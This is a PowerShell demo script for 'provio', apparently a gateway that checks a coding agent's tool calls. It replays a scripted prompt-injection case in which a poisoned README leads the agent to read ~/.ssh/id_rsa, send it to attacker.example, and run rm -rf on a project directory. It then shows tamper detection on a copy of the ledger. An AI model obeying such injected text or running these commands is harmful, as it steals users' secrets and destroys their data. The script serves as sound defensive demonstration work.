<#
  provio attack demo - offline, reproducible, no API key. (PowerShell)

  A coding agent reads a poisoned README (fixture-repo/README.md) whose hidden
  comment tells it to exfiltrate an SSH key and delete a directory. The agent's
  tool-call CHOICES are scripted (the JSON payloads in .\calls\), exactly as
  Claude Code would emit them to a PreToolUse/PostToolUse hook. Everything provio
  does - the decisions, the ledger records, verify - is REAL: each payload is
  fed to the real `provio` binary through `provio check --format claude-code`, the
  same gateway Claude Code calls before every tool runs.

    .\run.ps1                          uses `provio` from PATH
    $env:PROVIO_BIN='C:\path\provio.exe'; .\run.ps1   uses a specific binary
#>
$ErrorActionPreference = 'Stop'
Set-Location -Path $PSScriptRoot

$provio = if ($env:PROVIO_BIN) { $env:PROVIO_BIN } else { 'provio' }
$policy = 'provio.yaml'
$ledger = '.provio/ledger.jsonl'

if (-not (Get-Command $provio -ErrorAction SilentlyContinue) -and -not (Test-Path $provio)) {
  Write-Error "provio binary not found. Install it (pip install provio) or set `$env:PROVIO_BIN."
  exit 1
}

function Rule { Write-Host ("-" * 70) -ForegroundColor DarkGray }

# Fresh ledger each run so the demo is deterministic.
if (Test-Path .provio) { Remove-Item -Recurse -Force .provio }
New-Item -ItemType Directory -Path .provio | Out-Null

$version = (& $provio --version)
Write-Host ""
Write-Host "provio attack demo" -NoNewline; Write-Host "  -  $version" -ForegroundColor DarkGray
Write-Host "An injected README tells the agent to steal a key and delete a directory." -ForegroundColor DarkGray
Write-Host "The agent's tool calls are scripted; provio's decisions and ledger are real." -ForegroundColor DarkGray
Rule

# label ; payload file : label is what the (scripted) agent tried; the verdict
# below always comes from provio.
$steps = @(
  @{ label = "read the project README (this pulls the injection into context)"; file = "calls/01-read-readme.json" },
  @{ label = "the read completes - poisoned text now in the model's context";   file = "calls/02-read-readme-complete.json" },
  @{ label = "act on the injection: read ~/.ssh/id_rsa";                         file = "calls/03-read-id_rsa.json" },
  @{ label = "exfiltrate it: WebFetch https://attacker.example/collect";         file = "calls/04-exfil-http.json" },
  @{ label = "cover tracks: rm -rf /home/dev/project";                           file = "calls/05-bash-rmrf.json" }
)

$n = 0
foreach ($step in $steps) {
  $n++
  Write-Host ("[{0}] " -f $n) -NoNewline -ForegroundColor White
  Write-Host ("agent -> " + $step.label)

  # Feed the scripted hook payload to the real gateway. We redirect the file
  # into stdin through cmd.exe: PowerShell 5.1 re-encodes piped strings, which
  # would corrupt the JSON, and it has no native `<` input redirection.
  $out = cmd /c "`"$provio`" check --format claude-code --policy $policy --ledger $ledger < `"$($step.file)`" 2>nul"
  $json = $null
  try { $json = ($out -join "`n") | ConvertFrom-Json } catch { $json = $null }
  $decision = $null; $reason = $null
  if ($json -and $json.hookSpecificOutput) {
    $decision = $json.hookSpecificOutput.permissionDecision
    $reason   = $json.hookSpecificOutput.permissionDecisionReason
  }

  switch ($decision) {
    'allow' { Write-Host ("    v ALLOW  " + $reason) -ForegroundColor Green }
    'deny'  { Write-Host ("    x DENY   " + $reason) -ForegroundColor Red }
    default { Write-Host "    . recorded  execution written to the ledger" -ForegroundColor Cyan }
  }
  Write-Host ""
}

Rule
Write-Host "provio log" -NoNewline; Write-Host "  - what the agent actually did" -ForegroundColor DarkGray
& $provio log --ledger $ledger
Write-Host ""

Write-Host "provio verify" -NoNewline; Write-Host "  - is the record intact?" -ForegroundColor DarkGray
& $provio verify --ledger $ledger
Write-Host ""
Rule

# Tamper demonstration - on a COPY, so the real ledger is left intact.
Write-Host "Now someone edits the evidence" -NoNewline; Write-Host " (on a copy of the ledger)" -ForegroundColor DarkGray
$tampered = Join-Path (Get-Location) '.provio\ledger.tampered.jsonl'
Copy-Item $ledger $tampered
# Rewrite the denied rm -rf into a harmless ls in the copied record. Write
# UTF-8 with no BOM so only that one record's hash changes.
$edited = (Get-Content -Raw $tampered) -replace 'rm -rf /home/dev/project', 'ls -la'
[System.IO.File]::WriteAllText($tampered, $edited, (New-Object System.Text.UTF8Encoding($false)))
Write-Host "`$ (edit the rm -rf record into a harmless ls) .provio/ledger.tampered.jsonl" -ForegroundColor DarkGray
Write-Host "provio verify --ledger .provio/ledger.tampered.jsonl"
& $provio verify --ledger .provio/ledger.tampered.jsonl
Write-Host ""
Write-Host "The chain named the exact record that was altered. Nothing was leaked," -ForegroundColor DarkGray
Write-Host "nothing was deleted, and the attempt is on the record." -ForegroundColor DarkGray
exit 0
